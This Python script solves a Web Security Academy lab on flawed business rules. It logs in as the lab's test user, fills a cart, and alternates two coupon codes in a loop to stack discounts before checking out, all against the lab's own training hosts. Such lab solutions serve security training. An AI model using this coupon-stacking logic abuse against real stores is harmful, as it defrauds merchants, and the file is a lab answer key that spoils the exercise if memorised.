import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Flawed enforcement of business rules')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# GET CSRF AND COOKIE
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = {"Cookie":f"session={r.cookies.get('session')}"}

# AUTH AS WIENER
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"csrf":csrf,"username":"wiener","password":"peter"}, allow_redirects=False)
wiener = r.cookies.get('session')
headers = {"Cookie":f"session={wiener}"}

# PUT JACKET INSIDE CART
r = requests.post("https://" + lab.id + ".web-security-academy.net/cart", headers=headers, data={"productId":1,"redir":"PRODUCT","quantity":1})
r = requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)

# GET DISCOUNTS
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
for i in range(4):
    r = requests.post("https://" + lab.id + ".web-security-academy.net/cart/coupon", headers=headers, data={"csrf":csrf,"coupon":"SIGNUP30"}, allow_redirects=False)
    r = requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)
    r = requests.post("https://" + lab.id + ".web-security-academy.net/cart/coupon", headers=headers, data={"csrf":csrf,"coupon":"NEWCUST5"}, allow_redirects=False)
    
# CHECKOUT

requests.post("https://" + lab.id + ".web-security-academy.net/cart/checkout", headers=headers, data={"csrf":csrf})   
requests.get("https://" + lab.id + ".web-security-academy.net/cart/order-confirmation?order-confirmed=true", headers=headers)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab")